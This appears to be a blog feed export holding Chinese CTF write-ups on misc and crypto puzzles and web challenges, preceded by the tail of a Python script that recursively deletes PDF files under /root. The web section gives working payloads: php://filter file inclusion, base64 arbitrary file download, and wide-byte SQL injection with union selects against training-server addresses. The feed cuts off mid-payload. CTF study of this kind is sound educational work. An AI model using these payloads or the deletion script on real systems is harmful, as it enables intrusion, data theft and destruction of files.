class=&quot;comment&quot;&gt;#!/user/bin/python&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; os&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;searchFiles&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(path)&lt;/span&gt;:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	listOfFile = []&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; dirpath, dirnames, filenames &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; os.walk(path):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; name &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; filenames:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; name.endswith(&lt;span class=&quot;string&quot;&gt;&#39;.pdf&#39;&lt;/span&gt;):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				filename = os.path.join(dirpath, name)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;				listOfFile.append(filename)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; listOfFile&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; __name__ == &lt;span class=&quot;string&quot;&gt;&#39;__main__&#39;&lt;/span&gt;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	path = &lt;span class=&quot;string&quot;&gt;&#39;/root&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	listOfFile = searchFiles(path)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; str(len(listOfFile)) + &lt;span class=&quot;string&quot;&gt;&quot; files to be deleted&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; file &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; listOfFile:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		os.remove(file)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>CTF题解20161019</title>
    <link href="http://yoursite.com/2016/10/19/CTF%E9%A2%98%E8%A7%A320161019/"/>
    <id>http://yoursite.com/2016/10/19/CTF题解20161019/</id>
    <published>2016-10-19T03:32:33.000Z</published>
    <updated>2016-10-19T05:18:09.792Z</updated>
    
    <content type="html"><![CDATA[<p>题目材料地址：<a href="https://github.com/BonjourChen/CTF/tree/master/misc-20161019" target="_blank" rel="external">题目材料</a></p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>Tips:答案是与一部动漫名字有关的小写英文字母。<br>flag格式：NSFOCUS{xxx}<br>先用binwalk看下，顺便把里面的压缩包分离出来：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/110620330.png" alt="mark"><br>得到key.zip。发现压缩包里面有密码。<br>办法一：直接爆破压缩包。<br>办法二：用UE或者Winhex打开，可以看到开头是FFD8，是个jpg来的，将后缀修改为.jpg，打开之后发现是张龙珠图片倒过来，所以flag为龙珠英文反过来写。<br>Flag：<code>NSFOCUS{llabnogard}</code></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>Tips:听说到处都是提示。<br>flag格式：NSFOCUS{xxx}<br>压缩包有密码，文件名提示是生日。生成一个生日的字典进行爆破，可以获得密码是19990908。解压，里面是张图片。用UE打开图片，可以看到flag：<code>NSFOCUS{You_4re_5o_Clever}</code><br> <img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/113634923.png" alt="mark"><br><a id="more"></a></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>这个动图为啥打不开？？？？？<br>flag格式：NSFOCUS{xxx}<br>UE打开文件，发现缺少了GIF头，补上头部合成GIF89a之后可以打开gif图片。然后用Stegsolve查看每一帧，拼起来得到：key is：dGhpcyBpcyBhIGdpZg==，将这串字符进行Base64解码得到：this is a gif，所以flag为：<code>NSFOCUS{ this is a gif }</code></p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>Tips:压缩包的密码就藏在这幅白色图片中，仔细找找看吧。<br>解压出来是一个password.png，一张白色的图片，还有一个zip.zip。UE打开图片，最后有提示使用Stegsolve：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/111015581.png" alt="mark"><br>于是用Stegsolve打开，查看每一个RGB层，发现：key{forensics_is_fun}<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/111047856.png" alt="mark"><br>那么压缩包的密码显然为：forensics_is_fun，解压压缩包看到a.gif。无法预览但是有缩略图。使用Stegsolve打开gif，然后查看每一帧，可以看到CTF{AS3X}<br>所以Flag为：<code>CTF{AS3X}</code></p>
<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p> 凯撒困在栅栏里了,需要你的帮助。<br>sfxjkxtfhwz9xsmijk6j6sthhj<br>flag格式：NSFOCUS{xxx}，以及之前的格式<br>先用密码机器进行栅栏解密：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/111106904.png" alt="mark"><br>然后使用脚本进行凯撒解密：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">lstr=<span class="string">"""sxkthzxmj66thfjxfw9sikjshj"""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">127</span>):</div><div class="line">	str1 = <span class="string">''</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> lstr:</div><div class="line">		temp = chr((ord(i)+p)%<span class="number">127</span>)</div><div class="line">		<span class="keyword">if</span> <span class="number">32</span>&lt;ord(temp)&lt;<span class="number">127</span> :</div><div class="line">			str1 = str1 + temp </div><div class="line">			feel = <span class="number">1</span></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			feel = <span class="number">0</span></div><div class="line">			<span class="keyword">break</span></div><div class="line">	<span class="keyword">if</span> feel == <span class="number">1</span>:</div><div class="line">		print(str1)</div></pre></td></tr></table></figure></p>
<p>在得到的结果中有一种情况与答案相近：nsfocushe11ocaesar4ndfence<br>所以flag为：<code>NSFOCUS{he11ocaesar4ndfence}</code></p>
<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>听说都是套路。<br>. . -.-. …- -. — . .-.. ..-. ..<br>flag格式：NSFOCUS{xxx}<br>摩斯密码，解密得到eecvnoelfi<br>看着不太对，使用栅栏解密看看：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/111248828.png" alt="mark"><br>5栏的结果反过来就是flag。<br>Flag：<code>NSFOCUS{ilovefence}</code></p>
<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>文件坏了，你能帮我找回flag么？<br>Tips:听说都是套路。<br>flag格式：NSFOCUS{xxx}<br>UE打开文件，然后列复制十六进制部分：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/111320214.png" alt="mark"><br>十六进制粘贴到Winhex中：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/111332765.png" alt="mark"><br>最后面可以看到flag：flag is f1ag_e434cfaf4e964142cb892d678e4f7445<br>Flag：<code>NSFOCUS{ f1ag_e434cfaf4e964142cb892d678e4f7445}</code></p>
<h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p> 最近收到了个资源app，分享给你，你懂的。<br>解压密码你懂的！！！<br>flag格式：NSFOCUS{xxx}<br>UE打开压缩包拉到最后就可以看到key：123321<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/111631309.png" alt="mark"><br>解压之后用Android Killer打开，搜索字符串就可以了：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112103844.png" alt="mark"><br>Flag：<code>NSFOCUS{NI TAI YOU CAI LE!}</code></p>
<h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p>猜猜这是多少次base加密…..<br>flag格式：NSFOCUS{xxx}<br>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line">a= base64.b64decode(<span class="string">'...'</span>) <span class="comment">#题目字符串</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">	a = base64.b64decode(a)</div><div class="line">	<span class="keyword">print</span> a</div><div class="line"><span class="keyword">print</span> a</div></pre></td></tr></table></figure></p>
<p>Flag：<code>NSFOCUS{flag_f67c2bcbfcfa30fccb36f72dca22a817}</code></p>
<h3 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h3><p>小明弄丢了文件，他找到下载的数据包，你能帮帮他么？<br>打开gif.pcapng，分析数据包，发现是通过syn为1的包进行数据传输，传输数据是一个gif。Wireshark的过滤器设置为tcp.flags.syn==1：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112139136.png" alt="mark"><br>接着将分组解析结果导出：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112155377.png" alt="mark"><br>这里Packet summary line可以不勾选：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112206841.png" alt="mark"><br>保存成file。打开：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112222753.png" alt="mark"><br>红框的部分的一部分数据就是我们想要的。用linux处理一下文件：<br>root@kali:~/Documents# cat file | grep “47 4f 41 54” &gt; 1.txt<br>然后用UE打开1.txt，用列模式抠出数据部分的Hex：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112244130.png" alt="mark"><br>复制到winhex中：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112256673.png" alt="mark"><br>然后保存就是一个gif了。<br>用Stegsolve打开gif，然后查看帧，可以看到flag：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112310375.png" alt="mark"><br>Flag：<code>TUCTF{this_transport_layer_is_a_syn}</code></p>
<h3 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h3><p>小明喜欢X站，找到站长的加密密码了(269330a3a6ad86f0d7574b78a9a637e6)，但是他不知道原密码，你能帮帮她么？<br>tips：站长喜欢用键盘记密码，比如以前用过asdf13573348998fdsa，不过他换号了，小明需要你….<br>tips2:小明说他找到新手机号是133<strong>54</strong>33<br>flag{站长的密码}<br>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">s1 = <span class="string">'asdf133'</span></div><div class="line">s2 = <span class="string">'33fdsa'</span></div><div class="line">s3 = <span class="string">'54'</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</div><div class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</div><div class="line">		str1 = s1 + str(i) + s3 + str(j) + s2</div><div class="line">		m = hashlib.md5()</div><div class="line">		m.update(str1)</div><div class="line">		res = m.hexdigest()</div><div class="line">		<span class="keyword">if</span> res == <span class="string">'269330a3a6ad86f0d7574b78a9a637e6'</span>:</div><div class="line">			<span class="keyword">print</span> i</div><div class="line">			<span class="keyword">print</span> j</div></pre></td></tr></table></figure></p>
<p>运行得到i=33，j=33<br>所以手机号为13333543333，密码为asdf13333543333fdsa。<br>Flag：<code>flag{asdf13333543333fdsa}</code></p>
<h3 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h3><p>hex-flag<br>UE打开，列复制十六进制部分到winhex：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112401551.png" alt="mark"><br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112413518.png" alt="mark"><br>可以看出这是一个zip文件。重命名为1.zip。发现压缩包有密码，尝试是否为伪加密，使用工具去掉伪加密：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112429287.png" alt="mark"><br>之后发现里面文件可以打开：<code>flag{zip?Z1P?zip?}</code></p>
<h3 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h3><p>女神走丢了。你能帮我找到她么？<br>flag{女神的坐标}<br>like:flag{12;11;11.11—111;11;0.11}<br>精确小数后两位即可，如存在，需四舍五入<br>用Winhex打开gif，发现文件的最后有个nvshen(jing).jpg，还有zip文件的末尾504B0506等。猜想有个zip文件。<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112439045.png" alt="mark"><br>于是往前查找nvshen<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112453582.png" alt="mark"><br>果然前面又出现了一次，这里应该就是压缩文件的头了。观察140001000800应该是zip头在504B0304之后。WH4T应该是压缩包的密码。于是从1400之后到末尾抠出来到新文件，补上开头504B0304，然后将将14000100改成14000000（去掉zip的伪加密），重命名为zip后缀。打开之后，解压密码为上面看到的WH4T。解压出图片之后，根据题目的要求，找坐标。查看图片详情：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112508153.png" alt="mark"><br>那么Flag：<code>flag{34;14;16.37---108;52;0.72}</code></p>
<h3 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h3><p> flag is flag{xxxx}<br>分析http流的时候很容易发现有个secret.txt，打开之后可以看到内容：the password for zip file is : ZipYourMouth<br>那么接下来就是找zip了。然后可以发现上面有个flag.zip，尝试提取出来。发现提取出来是坏的，用winrar无法修复。<br>在pcap文件中直接查找zip文件头Hex：504B0304，可以发现在1139行还有一个zip。里面有个flag.txt。<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112519287.png" alt="mark"><br>提取出来之后，用winrar修复，根据上面找到的压缩包密码就可以解压了。打开就是flag：Flag-qscet5234diQ。<br>Flag：<code>flag{ qscet5234diQ}</code></p>
<h3 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h3><p>ting shuo he xiang su you guan<br>flag is flag{xxxx}<br>使用Stegsolve打开图片，然后在RGB有数据的位都勾上：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112538216.png" alt="mark"><br>可以看出这是一张PNG图片，保存成bin文件，然后重命名为1.png。Flag在图片里：<br><img src="http://of9x0sxb3.bkt.clouddn.com/blog/20161019/112548295.png" alt="mark"><br>Flag：<code>IceCTF{puT_Th4t_1n_yoUr_cOlOrng_Book_4nD_5moKe_1T}</code></p>
<h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><p>答案非标准格式，提交前加上flag{}<br>yhnhjm ytfvbh wsxdrfvgy resxcfv tgvgy dfresxc yhnhu oijm,l uhbnmko<br>键盘密码：h o w a r e y o u<br>Flag：<code>flag{howareyou}</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目材料地址：&lt;a href=&quot;https://github.com/BonjourChen/CTF/tree/master/misc-20161019&quot;&gt;题目材料&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h3&gt;&lt;p&gt;Tips:答案是与一部动漫名字有关的小写英文字母。&lt;br&gt;flag格式：NSFOCUS{xxx}&lt;br&gt;先用binwalk看下，顺便把里面的压缩包分离出来：&lt;br&gt;&lt;img src=&quot;http://of9x0sxb3.bkt.clouddn.com/blog/20161019/110620330.png&quot; alt=&quot;mark&quot;&gt;&lt;br&gt;得到key.zip。发现压缩包里面有密码。&lt;br&gt;办法一：直接爆破压缩包。&lt;br&gt;办法二：用UE或者Winhex打开，可以看到开头是FFD8，是个jpg来的，将后缀修改为.jpg，打开之后发现是张龙珠图片倒过来，所以flag为龙珠英文反过来写。&lt;br&gt;Flag：&lt;code&gt;NSFOCUS{llabnogard}&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x02&quot;&gt;&lt;a href=&quot;#0x02&quot; class=&quot;headerlink&quot; title=&quot;0x02&quot;&gt;&lt;/a&gt;0x02&lt;/h3&gt;&lt;p&gt;Tips:听说到处都是提示。&lt;br&gt;flag格式：NSFOCUS{xxx}&lt;br&gt;压缩包有密码，文件名提示是生日。生成一个生日的字典进行爆破，可以获得密码是19990908。解压，里面是张图片。用UE打开图片，可以看到flag：&lt;code&gt;NSFOCUS{You_4re_5o_Clever}&lt;/code&gt;&lt;br&gt; &lt;img src=&quot;http://of9x0sxb3.bkt.clouddn.com/blog/20161019/113634923.png&quot; alt=&quot;mark&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="MISC" scheme="http://yoursite.com/tags/MISC/"/>
    
      <category term="Crypto" scheme="http://yoursite.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>南京邮电大学网络攻防训练平台题解——WEB</title>
    <link href="http://yoursite.com/2016/10/13/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%AE%AD%E7%BB%83%E5%B9%B3%E5%8F%B0%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94WEB/"/>
    <id>http://yoursite.com/2016/10/13/南京邮电大学网络攻防训练平台题解——WEB/</id>
    <published>2016-10-13T09:08:16.000Z</published>
    <updated>2016-10-13T09:17:34.271Z</updated>
    
    <content type="html"><![CDATA[<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>网页源代码：<code>nctf{flag_admiaanaaaaaaaaaaa}</code></p>
<h3 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h3><p>QNKCDZO的md5值为0e830400451993494058024219903391,所以显然根据在php中md5函数的判断规则，只要字符串的md5值开始也是0e则相等。<code>http://115.28.150.176/md5/index.php?a=s878926199a</code><br>flag：<code>nctf{md5_collision_is_easy}</code></p>
<h3 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h3><p>用firebug查看到输入框中有maxlength=”10”，改大了之后再输入zhimakaimen即可。<br>flag：<code>nctf{follow_me_to_exploit}</code></p>
<h3 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h3><p>发现用bp截取不到数据包，用御剑也扫不出东西，于是把gif下载下来，用UE打开，发现最后藏了flag：<code>nctf{photo_can_also_hid3_msg}</code><br><a id="more"></a></p>
<h3 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h3><p>查看源代码，在最后有一个SO.html，点开发现S0.html，点开发现SO.htm，点开发现S0.htm，点开发现404.html，点开发现一段script的注释，里面藏着flag：<code>nctf{this_is_a_fl4g}</code></p>
<h3 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h3><p>在浏览器console中运行即可：<code>flag：nctf{javascript_aaencode}</code></p>
<h3 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h3><p>bp抓包发现<code>http://chinalover.sinaapp.com/web8/search_key.php</code>，查看内容就会发现其中存在flag。<br>key is : <code>nctf{yougotit_script_now}</code></p>
<h3 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h3><p>用bp的repeater，然后在请求中增加referer:www.google.com<br>flag:<code>nctf{http_referer}</code></p>
<h3 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h3><p>将php保存在本地环境运行。记得将eval改成echo即可。<br>flag:<code>nctf{gzip_base64_hhhhhh}</code></p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>使用filter的方式读取php的源代码<code>http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code><br>得到源码的Base64，解码得到：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">    &lt;title&gt;asdf&lt;/title&gt;</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    error_reporting(<span class="number">0</span>);</div><div class="line">    <span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</div><div class="line">    $file=$_GET[<span class="string">'file'</span>];</div><div class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">include</span>($file);</div><div class="line"><span class="comment">//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>于是可以看到flag：<code>nctf{edulcni_elif_lacol_si_siht}</code></p>
<h3 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h3><p>bp抓包发现在<code>http://chinalover.sinaapp.com/web9/index.php</code>中的Header头中存在flag。<br>flag: <code>nctf{this_is_302_redirect}</code></p>
<h3 id="Download"><a href="#Download" class="headerlink" title="Download~!"></a>Download~!</h3><p>查看源代码有这么两行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;p&gt;&lt;a href=&quot;download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=&quot; target=&quot;_blank&quot;&gt;星星点灯&lt;/a&gt;&lt;/p&gt;</div><div class="line">&lt;p&gt;&lt;a href=&quot;download.php?url=YnV4aWFuZ3poYW5nZGEubXAz&quot; target=&quot;_blank&quot;&gt;不想长大&lt;/a&gt;&lt;/p&gt;</div></pre></td></tr></table></figure></p>
<p>于是可以用这个办法将download.php的源码down下来：<code>http://way.nuptzj.cn/web6/download.php?url=ZG93bmxvYWQucGhw</code><br>打开源码，发现：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">??<span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">include</span>(<span class="string">"hereiskey.php"</span>);</div><div class="line">$url=base64_decode($_GET[url]);</div><div class="line"><span class="keyword">if</span>( $url==<span class="string">"hereiskey.php"</span> || $url==<span class="string">"buxiangzhangda.mp3"</span> || $url==<span class="string">"xingxingdiandeng.mp3"</span> || $url==<span class="string">"download.php"</span>)&#123;</div><div class="line">    $file_size = filesize($url);</div><div class="line">    header ( <span class="string">"Pragma: public"</span> );</div><div class="line">    header ( <span class="string">"Cache-Control: must-revalidate, post-check=0, pre-check=0"</span> );</div><div class="line">    header ( <span class="string">"Cache-Control: private"</span>, <span class="keyword">false</span> );</div><div class="line">    header ( <span class="string">"Content-Transfer-Encoding: binary"</span> );</div><div class="line">    header ( <span class="string">"Content-Type:audio/mpeg MP3"</span>);</div><div class="line">    header ( <span class="string">"Content-Length: "</span> . $file_size);</div><div class="line">    header ( <span class="string">"Content-Disposition: attachment; filename="</span>.$url);</div><div class="line">    <span class="keyword">echo</span>(file_get_contents($url));</div><div class="line">    <span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Access Forbidden!"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>包含了一个hereiskey.php，用上面的办法继续down下源码，打开就可以看到key了：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">?<span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//flag:nctf&#123;download_any_file_666&#125;</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h3><p>bp改包，将cookie中的Login=0改成Login=1<br>flag：<code>nctf{cookie_is_different_from_session}</code></p>
<h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>题目提示robots.txt，那么就查看robots.txt：<code>http://chinalover.sinaapp.com/web11/robots.txt</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">别太开心，flag不在这，这个文件的用途你看完了？</div><div class="line">在CTF比赛中，这个文件往往存放着提示信息</div><div class="line"></div><div class="line">TIP:sql.php</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_GET[id]) &#123;</div><div class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $id = intval($_GET[id]);</div><div class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</div><div class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span>($query[content]);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>关键在于intval函数，将string转换成int。那么就很好构造了：<code>http://chinalover.sinaapp.com/web11/sql.php?id=1024.01</code><br>the flag is:<code>nctf{query_in_mysql}</code></p>
<h3 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a>sql injection 3</h3><p>证明存在宽字节注入：<code>http://115.28.150.176/sqli/index.php?id=%df&#39; 2%23</code><br>执行的sql语句：SELECT id,title FROM news WHERE id=’運’ 2#’<br>ErrorYou have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘2#’’ at line 1<br>判断列数：<code>http://115.28.150.176/sqli/index.php?id=%df&#39;order by 2%23</code><br>数据库：<code>http://115.28.150.176/sqli/index.php?id=%df&#39; union select database(),1 %23</code><br>执行的sql语句：SELECT id,title FROM news WHERE id=’運’ union select database(),1 #’<br>id: sqli1 title: 1<br>找表名：<code>http://115.28.150.176/sqli/index.php?id=%df&#39; union select 1,group_concat(table_name) from information_schema.tables where 